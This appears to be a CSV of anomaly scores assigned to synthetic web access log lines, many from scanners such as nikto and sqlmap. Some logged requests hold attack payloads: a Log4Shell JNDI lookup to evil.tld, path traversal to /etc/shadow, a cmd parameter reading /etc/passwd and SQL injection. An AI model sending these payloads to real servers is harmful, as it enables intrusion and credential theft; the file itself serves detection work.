score_content,score_session,score_fused,score_fused_norm,line
4.830228805541992,,4.830228805541992,4.830228805541992,50.130.202.112 - - [10/Jan/2025:12:01:06 +0000] "POST /contact HTTP/1.1" 204 7662 "-" "dirb/2.22"
0.2686700224876404,,0.2686700224876404,0.2686700224876404,187.3.92.144 - - [10/Jan/2025:12:01:06 +0000] "GET /assets/app.css HTTP/1.1" 201 18763 "https://twitter.com/" "nikto/2.5.0"
48.74532699584961,,48.74532699584961,48.74532699584961,87.138.138.244 - - [10/Jan/2025:12:01:06 +0000] "HEAD /cgi-bin/test.cgi HTTP/1.1" 304 4457 "https://example.com/" "nikto/2.5.0"
27.641237258911133,,27.641237258911133,27.641237258911133,9.243.52.194 - - [10/Jan/2025:12:01:09 +0000] "DELETE /contact HTTP/1.1" 200 1444 "https://example.com/" "python-requests/2.31.0"
0.21920615434646606,,0.21920615434646606,0.21920615434646606,25.136.36.93 - - [10/Jan/2025:12:01:09 +0000] "GET /assets/app.css HTTP/1.1" 200 5729 "-" "python-requests/2.31.0"
50.03374099731445,,50.03374099731445,50.03374099731445,111.178.229.50 - - [10/Jan/2025:12:01:10 +0000] "DELETE /search?q=monitor HTTP/1.1" 200 903 "https://news.ycombinator.com/" "python-requests/2.31.0"
73.45731353759766,,73.45731353759766,73.45731353759766,223.254.135.66 - - [10/Jan/2025:12:01:12 +0000] "OPTIONS /login HTTP/1.1" 200 18396 "https://example.com/" "curl/7.85.0"
129.97996520996094,,129.97996520996094,129.97996520996094,34.111.191.72 - - [10/Jan/2025:12:01:14 +0000] "TRACE /search?q=headphones HTTP/1.1" 302 15098 "https://twitter.com/" "nikto/2.5.0"
104.7841796875,,104.7841796875,104.7841796875,157.81.125.193 - - [10/Jan/2025:12:01:15 +0000] "TRACE /profile HTTP/1.1" 200 19274 "https://example.com/" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 Version/17.0 Safari/605.1.15"
30229.404296875,,30229.404296875,30229.404296875,220.205.69.97 - - [10/Jan/2025:12:01:16 +0000] "TRACE /logout HTTP/1.1" 403 346 "https://example.com/" "curl/7.85.0"
13.349745750427246,,13.349745750427246,13.349745750427246,116.224.60.221 - - [10/Jan/2025:12:01:17 +0000] "PUT /dashboard HTTP/1.1" 200 12291 "https://news.ycombinator.com/" "sqlmap/1.7.2#stable"
70.09026336669922,,70.09026336669922,70.09026336669922,37.174.77.174 - - [10/Jan/2025:12:01:20 +0000] "HEAD /api/product?id=123 HTTP/1.1" 200 6819 "https://news.ycombinator.com/" "nikto/2.5.0"
73.36837768554688,,73.36837768554688,73.36837768554688,133.82.198.31 - - [10/Jan/2025:12:01:20 +0000] "OPTIONS /logout HTTP/1.1" 200 5747 "-" "sqlmap/1.7.2#stable"
95.8746566772461,,95.8746566772461,95.8746566772461,49.184.236.219 - - [10/Jan/2025:12:01:21 +0000] "OPTIONS /?id=%24%7Bjndi%3Aldap%3A%2F%2Fevil.tld%2Fa%7D HTTP/1.1" 200 16491 "https://example.com/" "python-requests/2.31.0"
3.2012250423431396,,3.2012250423431396,3.2012250423431396,137.90.253.223 - - [10/Jan/2025:12:01:24 +0000] "POST /.git/config HTTP/1.1" 200 18954 "https://twitter.com/" "dirb/2.22"
104.6832046508789,,104.6832046508789,104.6832046508789,29.225.147.74 - - [10/Jan/2025:12:01:27 +0000] "TRACE /dashboard HTTP/1.1" 200 10110 "-" "dirb/2.22"
72.95809173583984,,72.95809173583984,72.95809173583984,191.33.122.78 - - [10/Jan/2025:12:01:30 +0000] "HEAD /search?q=phone HTTP/1.1" 302 7368 "https://twitter.com/" "dirb/2.22"
30.498090744018555,,30.498090744018555,30.498090744018555,89.121.163.18 - - [10/Jan/2025:12:01:30 +0000] "DELETE /dashboard HTTP/1.1" 302 12656 "https://example.com/" "nikto/2.5.0"
70.07107543945312,,70.07107543945312,70.07107543945312,107.227.234.28 - - [10/Jan/2025:12:01:30 +0000] "HEAD /search?q=monitor HTTP/1.1" 200 14954 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 Version/17.0 Safari/605.1.15"
129.97933959960938,,129.97933959960938,129.97933959960938,221.84.63.83 - - [10/Jan/2025:12:01:30 +0000] "TRACE /search?q=headphones HTTP/1.1" 302 14920 "https://twitter.com/" "python-requests/2.31.0"
38.68826675415039,,38.68826675415039,38.68826675415039,1.34.25.91 - - [10/Jan/2025:12:01:30 +0000] "PUT /api/product?id=123 HTTP/1.1" 302 1142 "https://twitter.com/" "Wget/1.21.2 (linux-gnu)"
30137.9140625,,30137.9140625,30137.9140625,37.142.46.249 - - [10/Jan/2025:12:01:32 +0000] "PUT /login HTTP/1.1" 400 1115 "-" "python-requests/2.31.0"
70.11244201660156,,70.11244201660156,70.11244201660156,237.128.112.63 - - [10/Jan/2025:12:01:33 +0000] "HEAD /search?q=ssd HTTP/1.1" 200 2944 "https://twitter.com/" "sqlmap/1.7.2#stable"
35.814876556396484,,35.814876556396484,35.814876556396484,186.226.47.60 - - [10/Jan/2025:12:01:36 +0000] "PUT /api/product?id=123 HTTP/1.1" 200 2563 "https://twitter.com/" "sqlmap/1.7.2#stable"
30220.13671875,,30220.13671875,30220.13671875,254.41.82.225 - - [10/Jan/2025:12:01:36 +0000] "OPTIONS /search?q=phone HTTP/1.1" 403 267 "https://www.google.com/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/120.0 Safari/537.36"
30229.193359375,,30229.193359375,30229.193359375,173.99.29.63 - - [10/Jan/2025:12:01:37 +0000] "TRACE /api/products HTTP/1.1" 401 1388 "https://www.google.com/" "Wget/1.21.2 (linux-gnu)"
7.784396171569824,,7.784396171569824,7.784396171569824,84.208.23.221 - - [10/Jan/2025:12:01:39 +0000] "POST /logout HTTP/1.1" 302 15714 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/120.0 Safari/537.36"
11110.55859375,,11110.55859375,11110.55859375,131.197.29.254 - - [10/Jan/2025:12:01:42 +0000] "OPTIONS /about HTTP/1.1" 500 52 "https://www.google.com/" "sqlmap/1.7.2#stable"
95.79859161376953,,95.79859161376953,95.79859161376953,56.212.81.60 - - [10/Jan/2025:12:01:45 +0000] "OPTIONS /search?q=phone HTTP/1.1" 200 189 "https://twitter.com/" "sqlmap/1.7.2#stable"
127.1704330444336,,127.1704330444336,127.1704330444336,77.218.213.222 - - [10/Jan/2025:12:01:45 +0000] "TRACE /api/product?id=123 HTTP/1.1" 200 4976 "https://news.ycombinator.com/" "curl/7.85.0"
30126.466796875,,30126.466796875,30126.466796875,221.201.234.229 - - [10/Jan/2025:12:01:47 +0000] "GET /profile HTTP/1.1" 400 183 "https://www.google.com/" "curl/7.85.0"
0.3273667097091675,,0.3273667097091675,0.3273667097091675,182.67.210.141 - - [10/Jan/2025:12:01:47 +0000] "GET /index.html HTTP/1.1" 200 5461 "https://www.google.com/" "curl/7.85.0"
13.337220191955566,,13.337220191955566,13.337220191955566,81.124.182.242 - - [10/Jan/2025:12:01:49 +0000] "PUT /api/products HTTP/1.1" 200 8966 "-" "nikto/2.5.0"
73.28156280517578,,73.28156280517578,73.28156280517578,168.20.19.73 - - [10/Jan/2025:12:01:52 +0000] "OPTIONS /dashboard HTTP/1.1" 200 9550 "https://example.com/" "nikto/2.5.0"
30.154308319091797,,30.154308319091797,30.154308319091797,52.171.215.10 - - [10/Jan/2025:12:01:54 +0000] "POST /search?q=laptop HTTP/1.1" 304 6329 "https://www.google.com/" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 Version/17.0 Safari/605.1.15"
47.721900939941406,,47.721900939941406,47.721900939941406,114.142.235.126 - - [10/Jan/2025:12:01:56 +0000] "HEAD /login HTTP/1.1" 200 6725 "-" "curl/7.85.0"
26.27385139465332,,26.27385139465332,26.27385139465332,104.19.206.95 - - [10/Jan/2025:12:01:57 +0000] "DELETE /.env HTTP/1.1" 200 17568 "-" "python-requests/2.31.0"
24.415748596191406,,24.415748596191406,24.415748596191406,168.110.83.167 - - [10/Jan/2025:12:02:00 +0000] "GET /api/backup?file=../../../../etc/shadow HTTP/1.1" 200 7518 "https://example.com/" "python-requests/2.31.0"
24.429882049560547,,24.429882049560547,24.429882049560547,194.152.37.83 - - [10/Jan/2025:12:02:02 +0000] "GET /search?q=camera HTTP/1.1" 200 16915 "https://twitter.com/" "nikto/2.5.0"
14.592938423156738,,14.592938423156738,14.592938423156738,9.45.189.230 - - [10/Jan/2025:12:02:03 +0000] "PUT /wp-login.php HTTP/1.1" 301 19361 "https://news.ycombinator.com/" "dirb/2.22"
24.40130615234375,,24.40130615234375,24.40130615234375,244.193.111.240 - - [10/Jan/2025:12:02:05 +0000] "GET /search?q=monitor HTTP/1.1" 200 14815 "https://twitter.com/" "dirb/2.22"
0.26949357986450195,,0.26949357986450195,0.26949357986450195,154.233.37.95 - - [10/Jan/2025:12:02:07 +0000] "GET /assets/app.js HTTP/1.1" 200 11289 "https://www.google.com/" "python-requests/2.31.0"
76.13253021240234,,76.13253021240234,76.13253021240234,240.118.111.197 - - [10/Jan/2025:12:02:09 +0000] "OPTIONS /phpmyadmin HTTP/1.1" 301 17902 "https://twitter.com/" "sqlmap/1.7.2#stable"
45.852333068847656,,45.852333068847656,45.852333068847656,55.201.221.93 - - [10/Jan/2025:12:02:10 +0000] "HEAD /cgi-bin/test.cgi HTTP/1.1" 200 9260 "https://www.google.com/" "dirb/2.22"
127.01555633544922,,127.01555633544922,127.01555633544922,182.212.114.163 - - [10/Jan/2025:12:02:13 +0000] "TRACE /search?q=%27+OR+1%3D1+-- HTTP/1.1" 200 6958 "https://news.ycombinator.com/" "dirb/2.22"
2.3057122230529785,,2.3057122230529785,2.3057122230529785,238.198.70.167 - - [10/Jan/2025:12:02:13 +0000] "GET / HTTP/1.1" 200 14459 "https://www.google.com/" "dirb/2.22"
70.10009002685547,,70.10009002685547,70.10009002685547,169.218.186.149 - - [10/Jan/2025:12:02:15 +0000] "HEAD /search?q=router HTTP/1.1" 200 17171 "https://example.com/" "sqlmap/1.7.2#stable"
11084.9912109375,,11084.9912109375,11084.9912109375,153.167.69.247 - - [10/Jan/2025:12:02:17 +0000] "HEAD /profile HTTP/1.1" 503 53 "https://twitter.com/" "sqlmap/1.7.2#stable"
0.25067979097366333,,0.25067979097366333,0.25067979097366333,38.36.142.18 - - [10/Jan/2025:12:02:19 +0000] "GET /assets/app.css HTTP/1.1" 200 12845 "-" "Wget/1.21.2 (linux-gnu)"
70.08086395263672,,70.08086395263672,70.08086395263672,251.44.246.154 - - [10/Jan/2025:12:02:20 +0000] "HEAD /search?q=router HTTP/1.1" 200 11820 "https://example.com/" "Wget/1.21.2 (linux-gnu)"
50.53606033325195,,50.53606033325195,50.53606033325195,91.246.58.18 - - [10/Jan/2025:12:02:20 +0000] "HEAD /profile HTTP/1.1" 304 1356 "https://example.com/" "curl/7.85.0"
69.98747253417969,,69.98747253417969,69.98747253417969,152.252.137.21 - - [10/Jan/2025:12:02:22 +0000] "HEAD /api/run?cmd=cat+%2Fetc%2Fpasswd HTTP/1.1" 200 3070 "-" "nikto/2.5.0"
11110.4755859375,,11110.4755859375,11110.4755859375,11.132.174.100 - - [10/Jan/2025:12:02:23 +0000] "OPTIONS /contact HTTP/1.1" 502 807 "https://news.ycombinator.com/" "curl/7.85.0"
0.21845807135105133,,0.21845807135105133,0.21845807135105133,61.91.41.56 - - [10/Jan/2025:12:02:23 +0000] "GET /assets/app.js HTTP/1.1" 204 1559 "https://news.ycombinator.com/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/120.0 Safari/537.36"
38.79835510253906,,38.79835510253906,38.79835510253906,163.106.69.143 - - [10/Jan/2025:12:02:25 +0000] "PUT /?id=%24%7Bjndi%3Aldap%3A%2F%2Fevil.tld%2Fa%7D HTTP/1.1" 304 5364 "-" "nikto/2.5.0"
5.939002513885498,,5.939002513885498,5.939002513885498,150.89.83.93 - - [10/Jan/2025:12:02:28 +0000] "POST /cgi-bin/test.cgi HTTP/1.1" 304 4775 "https://example.com/" "sqlmap/1.7.2#stable"
27.702049255371094,,27.702049255371094,27.702049255371094,22.110.83.149 - - [10/Jan/2025:12:02:28 +0000] "DELETE /logout HTTP/1.1" 200 6717 "https://example.com/" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 Version/17.0 Safari/605.1.15"
27.684511184692383,,27.684511184692383,27.684511184692383,45.104.57.241 - - [10/Jan/2025:12:02:29 +0000] "DELETE /contact HTTP/1.1" 200 10948 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 Version/17.0 Safari/605.1.15"
1.8799434900283813,,1.8799434900283813,1.8799434900283813,195.12.2.254 - - [10/Jan/2025:12:02:32 +0000] "GET /phpmyadmin HTTP/1.1" 200 6372 "https://twitter.com/" "curl/7.85.0"
35.80337905883789,,35.80337905883789,35.80337905883789,38.48.36.5 - - [10/Jan/2025:12:02:34 +0000] "PUT /search?q=router HTTP/1.1" 200 6496 "https://www.google.com/" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 Version/17.0 Safari/605.1.15"
52.97721862792969,,52.97721862792969,52.97721862792969,232.63.41.108 - - [10/Jan/2025:12:02:35 +0000] "DELETE /api/backup?file=../../../../etc/shadow HTTP/1.1" 302 7613 "https://news.ycombinator.com/" "sqlmap/1.7.2#stable"
27.115495681762695,,27.115495681762695,27.115495681762695,148.197.254.196 - - [10/Jan/2025:12:02:38 +0000] "POST /search?q=%27+OR+1%3D1+-- HTTP/1.1" 200 316 "https://example.com/" "dirb/2.22"
30.146696090698242,,30.146696090698242,30.146696090698242,108.134.108.209 - - [10/Jan/2025:12:02:39 +0000] "POST /search?q=laptop HTTP/1.1" 301 19961 "-" "dirb/2.22"
13.410843849182129,,13.410843849182129,13.410843849182129,190.193.225.124 - - [10/Jan/2025:12:02:39 +0000] "PUT /logout HTTP/1.1" 204 4280 "https://example.com/" "dirb/2.22"
1.9817394018173218,,1.9817394018173218,1.9817394018173218,25.201.190.251 - - [10/Jan/2025:12:02:41 +0000] "GET /contact HTTP/1.1" 200 6766 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 Version/17.0 Safari/605.1.15"
50.333621978759766,,50.333621978759766,50.333621978759766,178.191.25.7 - - [10/Jan/2025:12:02:43 +0000] "HEAD /server-status HTTP/1.1" 302 6399 "https://www.google.com/" "dirb/2.22"
1.7890805006027222,,1.7890805006027222,1.7890805006027222,89.67.167.165 - - [10/Jan/2025:12:02:45 +0000] "GET /server-status HTTP/1.1" 200 493 "https://twitter.com/" "nikto/2.5.0"
0.24915450811386108,,0.24915450811386108,0.24915450811386108,11.19.113.41 - - [10/Jan/2025:12:02:47 +0000] "GET /assets/app.css HTTP/1.1" 200 12443 "https://example.com/" "python-requests/2.31.0"
